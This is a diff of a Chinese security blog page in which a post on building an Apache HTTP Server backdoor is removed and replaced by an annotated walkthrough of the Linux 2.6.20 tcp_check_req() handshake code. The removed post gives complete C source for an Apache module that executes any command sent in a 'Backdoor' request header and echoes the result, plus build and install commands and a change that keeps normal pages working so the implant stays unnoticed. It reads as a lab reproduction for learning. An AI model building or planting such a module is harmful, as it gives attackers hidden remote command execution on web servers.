@@ -3,30 +3,20 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Apache HTTP Server 后门开发 | Err0r</title>
+  <title>linux部分内核源码解析 | Err0r</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="复现一下一航大佬的博客里的实验。">
-<meta name="keywords" content="后门">
+  <meta name="description" content="对于三次握手协议中的第三次握手的验证报文的合法性源码的解析。">
+<meta name="keywords" content="内核解析,内核2.6.20">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Apache HTTP Server 后门开发">
-<meta property="og:url" content="http://Err0rzz.github.io/2018/03/05/Apache-HTTP-Server-后门开发/index.html">
+<meta property="og:title" content="linux部分内核源码解析">
+<meta property="og:url" content="http://Err0rzz.github.io/2018/06/15/linux部分内核源码解析/index.html">
 <meta property="og:site_name" content="Err0r">
-<meta property="og:description" content="复现一下一航大佬的博客里的实验。">
+<meta property="og:description" content="对于三次握手协议中的第三次握手的验证报文的合法性源码的解析。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.imgur.com/MA5raqF.png">
-<meta property="og:image" content="https://i.imgur.com/oITokNt.png">
-<meta property="og:image" content="https://i.imgur.com/wC6CHlA.png">
-<meta property="og:image" content="https://i.imgur.com/QHbNHkQ.png">
-<meta property="og:image" content="https://i.imgur.com/h70UVxV.png">
-<meta property="og:image" content="https://i.imgur.com/Pyhkj9p.png">
-<meta property="og:image" content="https://i.imgur.com/9jJq8rE.png">
-<meta property="og:image" content="https://i.imgur.com/f6NrLtw.png">
-<meta property="og:image" content="https://i.imgur.com/dEjDVnT.png">
-<meta property="og:updated_time" content="2018-03-09T11:22:55.934Z">
+<meta property="og:updated_time" content="2018-06-15T14:46:55.451Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Apache HTTP Server 后门开发">
-<meta name="twitter:description" content="复现一下一航大佬的博客里的实验。">
-<meta name="twitter:image" content="https://i.imgur.com/MA5raqF.png">
+<meta name="twitter:title" content="linux部分内核源码解析">
+<meta name="twitter:description" content="对于三次握手协议中的第三次握手的验证报文的合法性源码的解析。">
   
     <link rel="alternative" href="/atom.xml" title="Err0r" type="application/atom+xml">
   
@@ -185,11 +175,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-Apache-HTTP-Server-后门开发" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-linux部分内核源码解析" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/03/05/Apache-HTTP-Server-后门开发/" class="article-date">
-      <time datetime="2018-03-05T08:24:05.000Z" itemprop="datePublished">2018-03-05</time>
+      <a href="/2018/06/15/linux部分内核源码解析/" class="article-date">
+      <time datetime="2018-06-15T14:30:36.000Z" itemprop="datePublished">2018-06-15</time>
 </a>
     </div>
   
@@ -202,7 +192,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Apache HTTP Server 后门开发
+      linux部分内核源码解析
     </h1>
   
 
@@ -213,7 +203,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/后门/">后门</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内核2-6-20/">内核2.6.20</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内核解析/">内核解析</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -223,33 +213,19 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>复现一下一航大佬的博客里的实验。<br><a id="more"></a></p>
-<p>参考文档：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://www.jianshu.com/p/9d9248922508</div><div class="line">https://httpd.apache.org/docs/2.4/developer/modguide.html</div></pre></td></tr></table></figure></p>
-<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>实现任意命令的功能<br>在目标服务器上安装一个后门，使得其对http请求头中的特定键-值产生反应，从而执行我们构造的命令。</p>
-<p>例如，我们使目标服务器对zz这个键产生反应，去执行zz所对应的值的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GET / HTTP/1.1</div><div class="line">Host: localhost</div><div class="line">Cookie: key=value</div><div class="line">zz: COMMAND</div></pre></td></tr></table></figure></p>
-<p>如果服务器收到该请求头，则执行COMMAND。</p>
-<p>为了实现以上功能，我们需要完成接下来几步：</p>
-<ul>
-<li>Apache扩展结构</li>
-<li>服务器获取一个HTTP请求的所有请求头</li>
-<li>执行系统命令并且获取结果<br><br><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1>1.使用apxs来实现apache的扩展，先生成一个基本的模板结构<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apxs -g -n backdoor</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="https://i.imgur.com/MA5raqF.png" alt=""></p>
-<p>2.通过apache文档可以看到，客户端所有的请求头都可以通过<strong>r-&gt;headers_in</strong>获得<br><img src="https://i.imgur.com/oITokNt.png" alt=""></p>
-<p>其实在文档里，官方也给出了遍历所有请求头的代码<br><img src="https://i.imgur.com/wC6CHlA.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">static int example_handler(request_rec *r)</div><div class="line">&#123;</div><div class="line">    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</div><div class="line">    const apr_array_header_t    *fields;</div><div class="line">    int                         i;</div><div class="line">    apr_table_entry_t           *e = 0;</div><div class="line">    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</div><div class="line"></div><div class="line">    fields = apr_table_elts(r-&gt;headers_in);</div><div class="line">    e = (apr_table_entry_t *) fields-&gt;elts;</div><div class="line">    for(i = 0; i &lt; fields-&gt;nelts; i++) &#123;</div><div class="line">        ap_rprintf(r, &quot;%s: %s\n&quot;, e[i].key, e[i].val);</div><div class="line">    &#125;</div><div class="line">    return OK;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>所以我们只需要看一下请求头里有没有出现Backdoor，然后进行操作就好了。</p>
-<p>然后差不多对着敲一下代码(其实大部分都是原来mod_backdoor.c的代码，添加了一部分自己的代码)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line">**  mod_backdoor.c -- Apache sample backdoor module</div><div class="line">**  [Autogenerated via ``apxs -n backdoor -g&apos;&apos;]</div><div class="line">**</div><div class="line">**  To play with this sample module first compile it into a</div><div class="line">**  DSO file and install it into Apache&apos;s modules directory</div><div class="line">**  by running:</div><div class="line">**</div><div class="line">**    $ apxs -c -i mod_backdoor.c</div><div class="line">**</div><div class="line">**  Then activate it in Apache&apos;s apache2.conf file for instance</div><div class="line">**  for the URL /backdoor in as follows:</div><div class="line">**</div><div class="line">**    #   apache2.conf</div><div class="line">**    LoadModule backdoor_module modules/mod_backdoor.so</div><div class="line">**    &lt;Location /backdoor&gt;</div><div class="line">**    SetHandler backdoor</div><div class="line">**    &lt;/Location&gt;</div><div class="line">**</div><div class="line">**  Then after restarting Apache via</div><div class="line">**</div><div class="line">**    $ apachectl restart</div><div class="line">**</div><div class="line">**  you immediately can request the URL /backdoor and watch for the</div><div class="line">**  output of this module. This can be achieved for instance via:</div><div class="line">**</div><div class="line">**    $ lynx -mime_header http://localhost/backdoor</div><div class="line">**</div><div class="line">**  The output should be similar to the following one:</div><div class="line">**</div><div class="line">**    HTTP/1.1 200 OK</div><div class="line">**    Date: Tue, 31 Mar 1998 14:42:22 GMT</div><div class="line">**    Server: Apache/1.3.4 (Unix)</div><div class="line">**    Connection: close</div><div class="line">**    Content-Type: text/html</div><div class="line">**</div><div class="line">**    The sample page from mod_backdoor.c</div><div class="line">*/</div><div class="line"></div><div class="line">#include &quot;httpd.h&quot;</div><div class="line">#include &quot;http_config.h&quot;</div><div class="line">#include &quot;http_protocol.h&quot;</div><div class="line">#include &quot;ap_config.h&quot;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">/* The sample content handler */</div><div class="line">static int backdoor_handler(request_rec *r)</div><div class="line">&#123;</div><div class="line">    /*</div><div class="line">    if (strcmp(r-&gt;handler, &quot;backdoor&quot;)) &#123;</div><div class="line">        return DECLINED;</div><div class="line">    &#125;</div><div class="line">    r-&gt;content_type = &quot;text/html&quot;;</div><div class="line"></div><div class="line">    if (!r-&gt;header_only)</div><div class="line">        ap_rputs(&quot;The sample page from mod_backdoor.c\n&quot;, r);</div><div class="line">    */</div><div class="line">    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</div><div class="line">    const apr_array_header_t    *fields;</div><div class="line">    int                         i;</div><div class="line">    apr_table_entry_t           *e = 0;</div><div class="line">    char FLAG = 0;</div><div class="line">    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</div><div class="line"></div><div class="line">    fields = apr_table_elts(r-&gt;headers_in);</div><div class="line">    e = (apr_table_entry_t *) fields-&gt;elts;</div><div class="line"></div><div class="line">    for(i = 0; i &lt; fields-&gt;nelts; i++) &#123;</div><div class="line">        if(strcmp(e[i].key, &quot;Backdoor&quot;) == 0)&#123;</div><div class="line">            FLAG = 1;</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (FLAG)&#123;</div><div class="line">        char * command = e[i].val;</div><div class="line">        ap_rprintf(r, &quot;Command: %s\n&quot;, command);</div><div class="line">        ap_rprintf(r, &quot;Result: \n&quot;, command);</div><div class="line">        FILE* fp = popen(command,&quot;r&quot;);</div><div class="line">        char buffer[0x100] = &#123;0&#125;;</div><div class="line">        int counter = 1;</div><div class="line">        while(counter)&#123;</div><div class="line">            counter = fread(buffer, 1, sizeof(buffer), fp);</div><div class="line">            ap_rwrite(buffer, counter, r);</div><div class="line">        &#125;</div><div class="line">        pclose(fp);</div><div class="line">    &#125;</div><div class="line">    return OK;</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void backdoor_register_hooks(apr_pool_t *p)</div><div class="line">&#123;</div><div class="line">    ap_hook_handler(backdoor_handler, NULL, NULL, APR_HOOK_MIDDLE);</div><div class="line">&#125;</div><div class="line"></div><div class="line">/* Dispatch list for API hooks */</div><div class="line">module AP_MODULE_DECLARE_DATA backdoor_module = &#123;</div><div class="line">    STANDARD20_MODULE_STUFF,</div><div class="line">    NULL,                  /* create per-dir    config structures */</div><div class="line">    NULL,                  /* merge  per-dir    config structures */</div><div class="line">    NULL,                  /* create per-server config structures */</div><div class="line">    NULL,                  /* merge  per-server config structures */</div><div class="line">    NULL,                  /* table of config file commands       */</div><div class="line">    backdoor_register_hooks  /* register hooks                      */</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
-<p>接着<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apxs -a -i -c mod_backdoor.c &amp;&amp; service apache2 restart</div></pre></td></tr></table></figure></p>
-<p>来启动backdoor这个module。</p>
-<p>就可以看到成果了<br><img src="https://i.imgur.com/QHbNHkQ.png" alt=""></p>
-<p>但是问题也来了<br>原来的主页–phpinfo页面<br><img src="https://i.imgur.com/h70UVxV.png" alt=""></p>
-<p>现在的主页<br><img src="https://i.imgur.com/Pyhkj9p.png" alt=""></p>
-<p>也就是说添加了这个module之后，一个正常的没有添加Backdoor请求头的请求会无法得到正确响应。</p>
-<p>然后参考文章文档：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://blog.csdn.net/ConeZXY/article/details/1897989</div><div class="line">http://blog.csdn.net/ConeZXY/article/details/1898000</div><div class="line">http://blog.csdn.net/ConeZXY/article/details/1898019</div><div class="line">http://zjwyhll.blog.163.com/blog/static/7514978120126254222294/</div><div class="line">http://www.apachetutor.org/dev/request</div></pre></td></tr></table></figure></p>
-<p><img src="https://i.imgur.com/9jJq8rE.png" alt=""><br>如果返回 OK , 这个模块就会通知服务器 , 我们已经处理完成了这个请求 , 并且没有发生错误<br>如果返回 DONE , 这个模块就会通知服务器 , 我们已经处理完成了这个请求 , 并且已经不需要再进行后续的处理了<br>如果返回 DECLINED , 则表示这个模块不需要对这个请求进行处理 , 那么服务器就会继续对其进行默认的处理</p>
-<p>我们将原先代码中的返回值由OK改成DECLINED试试<br><img src="https://i.imgur.com/f6NrLtw.png" alt=""><br>正常执行了命令，且把phpinfo给显示了出来<br>如果不发送Backdoor请求头<br><img src="https://i.imgur.com/dEjDVnT.png" alt=""><br>正常的phpinfo页面<br><br></p>
-<p>通过这次实验的学习，我对于apache环境的搭建以及apache请求头这些配置啊模块啊都有了一定的了解，同时也还是好菜…</p>
+        <p>对于三次握手协议中的第三次握手的验证报文的合法性源码的解析。<br><a id="more"></a></p>
+<p><strong>tcp_check_req()</strong>来处理接收到的TCP段，判断是否是合法的TCP包。处理过程如下：</p>
+<ol>
+<li>解析并获取段中的TCP选项。</li>
+<li>校验TCP序号。</li>
+<li><strong>如果是SYN段，则作为SYN段再处理一次。</strong></li>
+<li><strong>检测ACK段确认序号是否有效，无效则立即返回不作处理。</strong></li>
+<li><strong>检测ACK段序号是否有效，无效则丢弃该段。</strong></li>
+<li><strong>如果是RST段或者是新的SYN段，则向客户端返送RST段进行复位。</strong></li>
+<li>校验通过，创建相应的“子”传输控制块。</li>
+<li>连接请求块插入已完成的连接的队列中，等到用户进程的accept()调用。</li>
+</ol>
+<p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">struct sock *tcp_check_req(struct sock *sk, struct sk_buff *skb, struct request_sock *req, struct request_sock **prev)  </div><div class="line">&#123;  </div><div class="line">	struct tcp_options_received tmp_opt;  </div><div class="line">	const struct tcphdr *th = tcp_hdr(skb);  /*获取段中的TCP选项*/</div><div class="line">	__be32 flg = tcp_flag_word(th) &amp; (TCP_FLAG_RST | TCP_FLAG_SYN | TCP_FLAG_ACK);  /*获取TCP首部中的RST，SYN，ACK字段*/</div><div class="line">	bool paws_reject = false;  </div><div class="line">      </div><div class="line">	tmp_opt.saw_tstamp = 0;  </div><div class="line">	if (th-&gt;doff &gt; (sizeof(struct tcphdr) &gt;&gt; 2)) &#123;  </div><div class="line">		tcp_parse_options(skb, &amp;tmp_opt, 0, NULL);            </div><div class="line">		if(tmp_opt.saw_tstamp) &#123;  /*判断TCP选项中是否带有时间戳*/</div><div class="line">			tmp_opt.ts_recent = req-&gt;ts_recent;  /*记录该时间戳*/</div><div class="line">            tmp_opt.ts_recent_stamp = get_seconds() - ((TCP_TIMEOUT_INIT/HZ) &lt;&lt; req-&gt;retrans);  /*记录下有效时间*/</div><div class="line">            paws_reject = tcp_paws_reject(&amp;tmp_opt, th-&gt;rst); /*校验TCP序号是否有效*/</div><div class="line">        &#125;  </div><div class="line">	&#125; </div><div class="line"></div><div class="line">    if (TCP_SKB_CB(skb)-&gt;seq == tcp_rsk(req)-&gt;rcv_isn &amp;&amp; flg == TCP_FLAG_SYN  </div><div class="line">        	&amp;&amp; ! paws_reject) &#123;/*如果接收到的是客户端重发的SYN段，则作为SYN段处理*/  	</div><div class="line">		req-&gt;rsk_ops-&gt;rtx_syn_ack(sk, req, NULL);  /*调用连接请求，向客户端发送SYN+ACK，即重新握手*/</div><div class="line">        return NULL;  </div><div class="line">        &#125;  </div><div class="line"></div><div class="line">	if ((flg &amp; TCP_FLAG_ACK) &amp;&amp; (TCP_SKB_CB(skb)-&gt;ack_seq !=   </div><div class="line">             tcp_rsk(req)-&gt;snt_isn + 1 + tcp_s_data_size(tcp_sk(sk))))        /* 如果接收段包含ACK标志，但确认序号不对，则返回“父”传输控制块，在上层函数处理 </div><div class="line">		return sk; </div><div class="line">        /* 如果发生了回绕，或者接收序号不在接收窗口内 */</div><div class="line"></div><div class="line">	if (paws_reject || ! tcp_in_window(TCP_SKB_CB(skb)-&gt;seq, TCP_SKB_CB(skb)-&gt;end_seq,  tcp_rsk(req)-&gt;rcv_isn + 1, tcp_rsk(req)-&gt;rcv_isn + 1 + req-&gt;rcv_wnd)) &#123;  /*如果ACK段序号无效或者序号不在接收窗口，则返回NULL，直接丢弃接收的段。*/             </div><div class="line">		if (! (flg &amp; TCP_FLAG_RST))  /*判断是不是RST段*/</div><div class="line">			req-&gt;rsk_ops-&gt;send_ack(sk, skb, req);  /*如果不是，则给对端发送ACK段*/</div><div class="line">		if (paws_reject)  </div><div class="line">			NET_INC_STATS_BH(sock_net(sk), LINUX_MIB_PAWSESTABREJECTED);  </div><div class="line">		return NULL;  </div><div class="line">        &#125;   </div><div class="line"></div><div class="line">	if (tmp_opt.saw_tstamp &amp;&amp; ! after(TCP_SKB_CB(skb)-&gt;seq, tcp_rsk(req)-&gt;rcv_isn + 1))  /*如果有时间戳选项，同时ACK段序号正常*/</div><div class="line">		req-&gt;ts_recent = tmp_opt.rcv_tsval; /* 保存ACK段的时间戳 */ </div><div class="line"></div><div class="line">	if (TCP_SKB_CB(skb)-&gt;seq == tcp_rsk(req)-&gt;rcv_isn) &#123;  /*如果ACK段的序号在接收窗口之外，则说明这是一个无效的SYN段*/</div><div class="line">		flg &amp;= ~TCP_FLAG_SYN;  /*去掉SYN标志*/</div><div class="line">        &#125; </div><div class="line"></div><div class="line">	if (flg &amp; (TCP_FLAG_RST | TCP_FLAG_SYN)) &#123;  /*如果段里有RST和SYN标志*/</div><div class="line">		TCP_INC_STATS_BH(sock_net(sk), TCP_MIB_ATTEMPTFAILS);  /*统计一下*/</div><div class="line">		goto embryonic_reset;  /*跳转到rest复位未连接完成的连接*/</div><div class="line">        &#125;   </div><div class="line"></div><div class="line">	if (! (flg &amp; TCP_FLAG_ACK))  /*按照正常的流程，该段中应该有ACK标志，如果没有，则直接返回NULL，丢弃该段*/</div><div class="line">		return NULL;</div><div class="line"></div><div class="line">	if (tmp_opt.saw_tstamp &amp;&amp; tmp_opt.rcv_tsecr)  </div><div class="line">		tcp_rsk(req)-&gt;snt_synack = tmp_opt.rcv_tsecr;  </div><div class="line">	else if (req-&gt;retrans) </div><div class="line">		tcp_rsk(req)-&gt;snt_synack = 0;  </div><div class="line"></div><div class="line">	child = inet_csk(sk)-&gt;icsk_af_ops-&gt;syn_recv_sock(sk, skb, req, NULL);        </div><div class="line">	if (child == NULL)  </div><div class="line">		goto listen_overflow;  /*目前为止，第三次握手的ACK是有效的*/</div><div class="line"></div><div class="line">      </div><div class="line">	inet_csk_reqsk_queue_unlink(sk, req, prev); /* 把连接请求块从半连接队列中删除 */  </div><div class="line">	inet_csk_reqsk_queue_removed(sk, req); /* 更新半连接队列的长度，如果为0，则删除定时器 */  </div><div class="line">      </div><div class="line">	inet_csk_reqsk_queue_add(sk, req, child);  /* 把完成三次握手的连接请求块，和新的sock关联起来，并把它移入全连接队列中 */  </div><div class="line">	return child;  </div><div class="line">      </div><div class="line">    listen_overflow:  </div><div class="line">        if (! sysctl_tcp_abort_on_overflow) &#123;  </div><div class="line">            inet_rsk(req)-&gt;acked = 1;  </div><div class="line">            return NULL;  </div><div class="line">        &#125;</div><div class="line">/*如果是由于服务器繁忙或者其他原因导致连接建立失败，且未设置sysctl_tcp_abort_on_overflow，则设置连接请求块中的acked标志，表示已接收到作为第三次握手的ACK段。*/</div><div class="line"></div><div class="line"></div><div class="line">    embryonic_reset:  </div><div class="line">        NET_INC_STATS_BH(sock_net(sk), LINUX_MIB_EMBRYONICRSTS);  </div><div class="line">        if (! (flg &amp; TCP_FLAG_RST))  </div><div class="line">            req-&gt;rsk_ops-&gt;send_reset(sk, skb);  </div><div class="line">     </div><div class="line">        inet_csk_reqsk_queue_drop(sk, req, prev);  /* 把连接请求块从半连接队列中删除，更新半连接队列 */</div><div class="line">        return NULL;  </div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
 
       
       
@@ -305,13 +281,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/03/05/Apache-HTTP-Server-后门开发/">Apache HTTP Server 后门开发</a></p>
+        <p><span>本文标题:</span><a href="/2018/06/15/linux部分内核源码解析/">linux部分内核源码解析</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Err0rzz 的个人博客">Err0rzz</a></p>
-        <p><span>发布时间:</span>2018年03月05日 - 16时24分</p>
-        <p><span>最后更新:</span>2018年03月09日 - 19时22分</p>
+        <p><span>发布时间:</span>2018年06月15日 - 22时30分</p>
+        <p><span>最后更新:</span>2018年06月15日 - 22时46分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/03/05/Apache-HTTP-Server-后门开发/" title="Apache HTTP Server 后门开发">http://Err0rzz.github.io/2018/03/05/Apache-HTTP-Server-后门开发/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2018/03/05/Apache-HTTP-Server-后门开发/　　作者: Err0rzz" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/06/15/linux部分内核源码解析/" title="linux部分内核源码解析">http://Err0rzz.github.io/2018/06/15/linux部分内核源码解析/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2018/06/15/linux部分内核源码解析/　　作者: Err0rzz" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -324,18 +300,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2018/03/09/Ubuntu下Apache2开启-关闭模板方法/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          Ubuntu下Apache2开启/关闭模板方法
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/03/05/Kali2018更新问题/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Kali2018更新问题</div>
+    <a href="/2018/05/04/第二届ZJGSCTFWP/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">第二届ZJGSCTFWP</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -346,7 +313,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#目的"><span class="toc-number">1.</span> <span class="toc-text">目的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#实现"><span class="toc-number">2.</span> <span class="toc-text">实现</span></a></li></ol>
+    
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -412,13 +379,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/03/09/Ubuntu下Apache2开启-关闭模板方法/" title="上一篇: Ubuntu下Apache2开启/关闭模板方法">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2018/03/05/Kali2018更新问题/" title="下一篇: Kali2018更新问题">
+            <a href="/2018/05/04/第二届ZJGSCTFWP/" title="下一篇: 第二届ZJGSCTFWP">
                 <i class="fa fa-angle-right"></i>
             </a>
         
